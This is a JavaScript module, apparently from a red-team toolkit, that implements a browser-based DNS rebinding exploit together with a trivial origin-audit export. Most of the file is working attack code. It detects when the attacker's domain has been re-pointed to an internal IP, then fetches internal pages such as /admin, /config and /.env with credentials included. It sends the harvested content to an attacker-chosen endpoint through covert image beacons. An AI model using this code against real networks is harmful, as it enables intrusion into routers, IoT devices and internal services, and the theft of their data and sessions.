/**
 * dns_rebinding.js — Browser‑side DNS Rebinding Attack & Origin Boundary Audit
 *
 * This module provides:
 *   1. `triggerRebindAttack()` – a weaponized DNS rebinding exploit that
 *      attempts to detect when the current origin has been re‑resolved to an
 *      internal IP address, then scans and harvests sensitive resources from
 *      the internal target (e.g., router admin pages, IoT devices). Designed
 *      for red‑team engagements with a controlled attacker‑owned domain and
 *      DNS server configured for rebinding.
 *
 *   2. Default export – a Pinpoint‑compatible `Origin_Boundary_Audit` that
 *      reports the current `window.location.origin`, `document.domain`, and
 *      other isolation parameters.
 *
 * **Prerequisites for the attack:**
 * - The attacker must control the DNS records for the current origin (the
 *   domain serving this script) with a very short TTL (e.g., 1 second).
 * - The initial DNS resolution must point to the attacker’s web server so
 *   the JavaScript can be loaded. After the page is served, the attacker
 *   updates the DNS record to point to the internal target IP (e.g.,
 *   192.168.1.1, 127.0.0.1).
 * - This script then re‑issues requests to the same origin. The browser, on
 *   TTL expiry, re‑resolves the domain and sends those requests to the
 *   internal target, bypassing Same‑Origin Policy (SOP) because the origin
 *   (scheme + host + port) has not changed.
 *
 * The attack is largely blocked by modern browsers’ DNS pinning, but remains
 * viable in certain legacy environments, IoT devices, and misconfigured
 * corporate networks.
 */

// ---------------------------------------------------------------------------
// 1. DNS Rebinding Attack Engine
// ---------------------------------------------------------------------------

/**
 * Default list of internal resources to probe after a successful rebind.
 * Adjust based on the target environment (routers, IoT, admin panels).
 */
const DEFAULT_RESOURCES = [
    '/',                              // Root page (often router status)
    '/admin',                         // Admin panels
    '/login',                         // Login pages
    '/config',                        // Configuration dumps
    '/cgi-bin/status',                // Common IoT / embedded device
    '/api/v1/system',                 // REST API endpoints
    '/.env',                          // Environment files (if misconfigured)
];

/**
 * Default probe path used to detect whether the DNS has rebinded.
 * The attacker’s server should respond with a unique header (e.g., 
 * `X-Rebind-Status: original`) that is checked in the probing function.
 * Alternatively, rely on timing / error messages.
 */
const DEFAULT_PROBE_PATH = '/__rebind_detect';

/**
 * Starts the DNS rebinding attack. The function will:
 *  1. Continuously probe the current origin to detect when the DNS has
 *     switched to an internal IP.
 *  2. Once detected, attempts to fetch internal resources and exfiltrate
 *     data back to an attacker‑controlled endpoint.
 *
 * @param {Object}   [options={}]
 * @param {number}   [options.probeInterval=500]       - ms between re‑resolution probes.
 * @param {number}   [options.maxWaitTime=30000]       - max ms to wait for a rebind.
 * @param {string[]} [options.internalResources]       - URLs to request after rebind.
 * @param {string}   [options.probePath]               - URL path for the rebind probe.
 * @param {string}   [options.exfilEndpoint]           - where to send harvested data (absolute URL).
 * @param {Function} [options.onDetectRebind]          - callback when rebind is detected.
 * @param {Function} [options.onHarvest]               - callback with harvested result.
 * @param {boolean}  [options.stealth=true]            - use subtle exfiltration (image beacons).
 * @returns {Promise<Object>} controller with `stop()` method and final report.
 */
export async function triggerRebindAttack(options = {}) {
    const {
        probeInterval = 500,
        maxWaitTime = 30000,
        internalResources = DEFAULT_RESOURCES,
        probePath = DEFAULT_PROBE_PATH,
        exfilEndpoint = null,       // if null, data is returned but not exfiltrated
        onDetectRebind = null,
        onHarvest = null,
        stealth = true,
    } = options;

    if (!window.isSecureContext) {
        console.warn('[dns_rebinding] Attack requires a secure context for best results (some fetches may be blocked).');
    }

    // ---- Helpers ----
    const delay = (ms) => new Promise(r => setTimeout(r, ms));

    /**
     * Probes the current origin to determine if it now resolves to an internal IP.
     * Uses a fetch to `probePath` and compares response headers/content with a
     * known “original” signature. In a real setup the attacker’s original server
     * would set a distinctive header (e.g., `X-Rebind-Origin: true`) or return a
     * specific body.
     * If the request fails with a network error (connection refused) or returns
     * different status/body, it is considered a rebind event.
     *
     * @returns {Promise<boolean>} true if DNS likely rebinded.
     */
    async function isRebinded() {
        const url = new URL(probePath, window.location.origin).href;
        try {
            const resp = await fetch(url, {
                mode: 'cors',
                cache: 'no-cache',
                headers: { 'Accept': '*/*' },
                // Signal timeout to avoid waiting too long for unresponsive internal services
                signal: AbortSignal.timeout ? AbortSignal.timeout(2000) : undefined,
            });
            // Check for attacker's custom header
            const rebindStatus = resp.headers.get('X-Rebind-Origin');
            if (rebindStatus === 'true') {
                // Original server still responding -> no rebind yet
                return false;
            }
            // If no custom header (or different), we assume the response came from an internal device
            return true;
        } catch (e) {
            // Network error (connection refused, timeout) strongly suggests the domain
            // now points to a host that doesn’t serve HTTP/HTTPS on that port, or is
            // firewalled. This is typical of a rebind to a non‑HTTP service, so we treat
            // it as a rebind event. However, a simple internet blip could also cause
            // errors. We’ll require multiple consecutive errors to reduce false positives.
            return null; // indeterminate
        }
    }

    // ---- Main attack loop ----
    let abort = false;
    const startTime = performance.now();
    let rebindDetected = false;
    let harvestResults = [];

    /**
     * Exfiltrate data using an image beacon (or fetch) to the attacker’s endpoint.
     * Returns true on success.
     */
    async function exfiltrate(data, endpoint) {
        if (!endpoint) return false;
        if (stealth) {
            // Use image beacon (GET request) to bypass CORS and reduce suspicion
            const payload = btoa(encodeURIComponent(JSON.stringify(data))).replace(/=+$/, '');
            const img = new Image();
            img.src = `${endpoint}?d=${payload}&t=${Date.now()}`;
            return true; // best effort
        } else {
            try {
                await fetch(endpoint, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(data),
                    headers: { 'Content-Type': 'application/json' },
                });
                return true;
            } catch (_) {
                return false;
            }
        }
    }

    /**
     * Once a rebind is confirmed, harvest internal resources and optionally
     * exfiltrate them.
     */
    async function harvestAfterRebind() {
        if (!rebindDetected) return;
        const results = [];
        for (const path of internalResources) {
            const url = new URL(path, window.location.origin).href;
            try {
                const resp = await fetch(url, {
                    mode: 'cors',
                    cache: 'no-cache',
                    credentials: 'include', // might steal session cookies
                    signal: AbortSignal.timeout ? AbortSignal.timeout(3000) : undefined,
                });
                const content = await resp.text();
                const entry = {
                    url,
                    status: resp.status,
                    contentType: resp.headers.get('content-type'),
                    contentLength: content.length,
                    contentSnippet: content.substring(0, 500), // avoid massive payloads
                    headers: {},
                };
                // Collect interesting headers
                for (const [key, val] of resp.headers.entries()) {
                    entry.headers[key] = val;
                }
                results.push(entry);
                if (onHarvest) {
                    try { onHarvest(entry); } catch (_) { }
                }
            } catch (err) {
                // Resource unreachable or blocked
                results.push({
                    url,
                    error: err.message,
                });
            }
            // Small delay between requests to avoid overwhelming the internal device
            await delay(100);
        }
        harvestResults = results;

        // Exfiltrate the whole batch
        if (exfilEndpoint) {
            await exfiltrate(results, exfilEndpoint);
        }
    }

    // Probe loop
    let consecutiveErrors = 0;
    const REBIND_CONFIRMATION_THRESHOLD = 3; // number of consecutive indeterminate results to confirm rebind
    while (!abort && !rebindDetected) {
        if (performance.now() - startTime > maxWaitTime) break;

        const status = await isRebinded();
        if (status === true) {
            rebindDetected = true;
            if (onDetectRebind) {
                try { onDetectRebind(); } catch (_) { }
            }
            break;
        } else if (status === null) {
            consecutiveErrors++;
            if (consecutiveErrors >= REBIND_CONFIRMATION_THRESHOLD) {
                rebindDetected = true;
                if (onDetectRebind) {
                    try { onDetectRebind(); } catch (_) { }
                }
                break;
            }
        } else {
            // status === false (original server still responding)
            consecutiveErrors = 0;
        }
        await delay(probeInterval);
    }

    // If rebind detected, start harvesting
    if (rebindDetected) {
        await harvestAfterRebind();
    }

    // Build final report and controller
    const finalElapsed = performance.now() - startTime;
    const finalReport = {
        rebindDetected,
        waitTimeMs: Math.round(finalElapsed),
        harvestResults,
        origin: window.location.origin,
        hostname: window.location.hostname,
        timestamp: Date.now(),
    };

    const controller = {
        stop() {
            abort = true;
        },
        report: finalReport,
    };

    return controller;
}

// ---------------------------------------------------------------------------
// 2. Pinpoint‑compatible Origin_Boundary_Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'dns_rebinding',
    title: 'Origin_Boundary_Audit',
    level: 5,
    info: 'Audits current window.location origin and document.domain security isolation status.',
    steps: [
        'Read window.location.origin.',
        'Inspect document.domain security state.',
    ],
    run: async () => {
        return {
            origin: window.location.origin,
            protocol: window.location.protocol,
            hostname: window.location.hostname,
            port: window.location.port || (window.location.protocol === 'https:' ? '443' : '80'),
            domain: document.domain,
        };
    },
};

export default pinpointModule;